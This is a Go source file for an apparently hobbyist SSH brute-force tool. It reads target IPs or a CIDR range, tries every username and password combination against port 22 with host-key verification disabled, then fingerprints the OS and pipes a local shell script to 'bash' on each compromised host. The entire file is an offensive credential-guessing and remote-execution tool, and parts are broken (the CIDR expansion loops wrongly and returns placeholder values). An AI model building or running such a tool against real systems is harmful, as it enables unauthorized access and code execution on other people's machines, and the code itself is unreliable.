package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

var validUser string
var validPass string

var userList, passList []string

var verbose bool

func check(e error) {
	// Kills program if error
	if e != nil {
		log.Fatal(e)
	}
}

func readFile(filename string) string {
	// reads file into a string
	fileBytes, err := ioutil.ReadFile(filename)
	check(err)
	fileString := string(fileBytes)
	return fileString
}

func readLines(path string) ([]string, error) {
	// reads every line of a file into a list
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}

	defer file.Close()

	// create list and append each line of the file to it
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines, scanner.Err()
}

func sshDialer(user string, pass string, rhost string, timeoutPtr *int) bool {
	// Attempts to make a SSH connection and returns whether that connection was sucessful or not

	// SSH config stuff
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         time.Duration(*timeoutPtr) * time.Millisecond,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// initiate ssh connection
	_, err := ssh.Dial("tcp", rhost+":22", config)

	// don't want to use check() here because this failure shouldn't kill the enitre program
	if err != nil {
		return false
	}
	return true
}

// change list param to pointer
func findUser(userList []string, passList []string, rhost string, timeoutPtr *int) (string, string) {
	// function to find a valid login for a remote host over SSH

	// brute force all usernames (i) and all passwords (j)
	for _, i := range userList {
		for _, j := range passList {
			fmt.Printf("%s:%s\n", i, j)

			// try each connection and return valid login combo
			if sshDialer(i, j, rhost, timeoutPtr) {
				fmt.Printf("Correct combination!\n")
				// TODO maybe add an option to get all valid logins or maybe find root login?
				return i, j
			}
		}
	}
	return "", ""
}

func sendCMD(rhost, cmd string) (string, error) {
	// send a command to the remote host over SSH

	// SSH config
	config := &ssh.ClientConfig{
		User: validUser,
		Auth: []ssh.AuthMethod{
			ssh.Password(validPass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// initiate SSH connection
	client, err := ssh.Dial("tcp", rhost+":22", config)

	// don't use check() as to not kill program if one endpoint fails
	if err != nil {
		//  this is ssh dial error (should never happen but you never know)
		return "", err
	}
	session, err := client.NewSession()
	if err != nil {
		// this is the session error
		return "", err
	}
	defer session.Close()

	// b is stdout from remote host
	var b bytes.Buffer
	session.Stdout = &b

	// send command and record if there is an error
	err = session.Run(cmd)

	// return stdout and error
	return b.String(), err
}

func expandCIDR(network string) []string {
	// expands a CIDR notated IP into a list of all the possible IP addresses it could be

	// get string into a net object for better manipulation
	_, ipv4Net, err := net.ParseCIDR(network)
	check(err)

	// find netmask and start ip
	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	// find the end value (i.e. a /25 will be 64)
	finish := (start & mask) | (mask ^ 0xffffffff)

	// loop through all ips in the subnet
	for i := start; i > finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		fmt.Println(i)
	}

	// i dont really remember why this is here. probably should return the list of ips
	// TODO fix this
	return []string{"a", "b"}
}

func main() {
	// define the possible flags
	ipFilePtr := flag.String("ip", "IP.txt", "This is the file that lists the IP addresses to scan")
	userFilePtr := flag.String("u", "", "This is the file that holds the usernames to try")
	passFilePtr := flag.String("p", "", "This is the file that holds the passwords to try")
	timeoutPtr := flag.Int("t", 50, "This is the timeout for the SSH connection (Going too low will cause everyting to fail)")
	rnetPointer := flag.String("n", "", "Network to try in CIDR notation")
	flag.Parse()

	var ipList []string

	// if else to pick where ips are coming from
	if *rnetPointer != "" {
		// pass subnet from cmdline
		ipListTmp := expandCIDR(*rnetPointer)
		ipList = ipListTmp

	} else {
		// get ips from txt file
		ipListTmp, err := readLines(*ipFilePtr)

		// help user out a bit
		if err != nil {
			flag.PrintDefaults()
			log.Fatal(err)
		}

		// had to do these shenanagans because the := wouldn't let me use ipList up there
		// TODO fix this
		ipList = ipListTmp

	}

	// main brute force loop
	for _, host := range ipList {

		fmt.Printf("Now working on: %s\n", host)

		// select the user and password lists
		// TODO why is this in the for loop??
		if *userFilePtr == "" {
			userList = []string{"one", "tm", "three"}
		} else {
			userListTmp, err := readLines(*userFilePtr)
			check(err)
			userList = append(userList, userListTmp...)
		}
		if *passFilePtr == "" {
			passList = []string{"a", "tm", "f"}
		} else {
			passListTmp, err := readLines(*passFilePtr)
			check(err)
			passList = append(passList, passListTmp...)
		}

		validUser, validPass = findUser(userList, passList, host, timeoutPtr)

		// rut ro raggy
		if validUser == "" || validPass == "" {
			fmt.Println("Failed to find valid creds :(")
		}

		var operatingSystem string
		// detect the os
		_, linuxErr := sendCMD(host, "uname")
		_, winErr := sendCMD(host, "cmd /c ver")

		// if the command works then we assume that is the os
		// wsl might break somethign like this. would need to test there
		// also pretending like mac and unix dont exist
		if linuxErr == nil {
			operatingSystem = "Linux"
		} else if winErr == nil {
			operatingSystem = "Windows"
		} else {
			fmt.Println("No clue what this is bud. Sorry to say")
		}

		// send the script
		if operatingSystem == "Linux" {
			script := readFile("test.sh")
			out, err := sendCMD(host, "cat "+script+"| bash")
			fmt.Println(out)
			fmt.Println(err)
		}
		out, _ := sendCMD(host, "cat outfile")
		fmt.Println(out)
	}
}
